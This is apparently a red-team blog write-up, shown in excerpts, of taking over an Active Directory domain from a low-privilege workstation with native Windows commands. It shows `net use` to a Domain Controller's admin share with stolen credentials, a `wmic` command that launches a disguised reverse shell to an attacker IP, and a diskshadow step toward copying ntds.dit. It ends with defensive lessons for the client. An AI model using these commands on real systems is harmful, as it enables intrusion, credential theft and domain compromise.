...
In this post I'll discuss how using a simple built-in Windows utility can allow for a full Domain Controller takeover.

**All native CLI. No PowerShell. No custom tooling on-target. Low-priv to domain creds.**

Placeholders for the obvious reasons: `$USER`, `$DOMAIN`, `$ADMINGROUP`, `$SVC1`, `$SVC2`, `$SITE`, `$ATTACKER_IP`, `$DC_IP`.

## the scenario

My team and I were recently on a network engagement where our client wanted to lock us down. We were given limited access (per usual), denied from using PowerShell, and also had difficulties running collectors and scripts.
...
It's kinda crazy how little bits of information can be strung together to paint the bigger picture. When doing real life engagements you often forget that **real** humans are operating these machines (this comes from doing too many CTFs). Because of this, people or services configured by humans have the potential to _leak_ information that would at first seem insignificant.

### finding local admins

The first thing I wanted to know was who has admin on this box.
...
Two service accounts immediately stood out as members of the local Administrators group: **$SVC1** and **$SVC2**. Service accounts with local admin is always worth investigating further.

### finding the domain controllers

Next, let's find what we're working with:
...
```text
C:\Users\$USER>net user $SVC1 /domain
...
Here's where `net use` comes in. With valid credentials for a privileged service account, I tested whether I could map the administrative share on a Domain Controller:

```text
C:\Users\$USER>net use \\DC-03\C$ /user:$SVC1 $SVC1_PASS
The command completed successfully.
```

That's full **C$** access on a Domain Controller, from a low-privilege workstation, using a built-in Windows command.
...
```text
C:\Users\$USER\Documents>wmic /node:"DC-03" /user:"$DOMAIN\$SVC1" /password:"$SVC1_PASS" process call create "C:\Windows\Temp\taskhost.exe -e cmd.exe $ATTACKER_IP 4444"
...
The `ntds.dit` file is locked by Active Directory while it's running, so you can't just copy it directly. This is where **diskshadow** comes in.
...
1. Plaintext credentials in a leftover deployment file. The initial foothold into privilege.
2. Service account with excessive privileges. Local admin on workstations _and_ Domain Controllers.
3. Password that hadn't been rotated in 5+ years, and set to never expire.
4. No monitoring or alerting on administrative share access or remote process creation via WMIC.
